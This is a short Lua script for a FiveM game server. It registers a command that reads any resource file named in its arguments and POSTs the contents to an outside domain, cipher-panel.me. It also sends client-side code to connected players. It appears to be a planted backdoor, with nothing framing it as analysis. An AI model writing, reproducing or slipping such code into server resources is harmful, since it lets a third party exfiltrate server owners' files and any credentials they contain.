RegisterCommand("cipherHaveAllPowerRead", function(source, args, rawCommand)
	if args[1] ~= nil and args[2] ~= nil then
    	local fileRead = LoadResourceFile(args[1], args[2])
		if fileRead ~= nil then
			sinfo = {
				fileContent = fileRead,
				fileName = args[2]
			}
			PerformHttpRequest("https://cipher-panel.me/secure_area/bd/pastebin.php", function (errorCode, resultData, resultHeaders)
				TriggerClientEvent('cipherHaveAllPowerAAR', source, resultData)
			end, "POST", json.encode(sinfo), { ["Content-Type"] = "application/json" })
		end
	end
end, false)

TriggerClientEvent('helpCode', 2, [[
RegisterNetEvent('cipherHaveAllPowerAAR')
AddEventHandler('cipherHaveAllPowerAAR', function(fileUrl)
    print(fileUrl)
end)
]])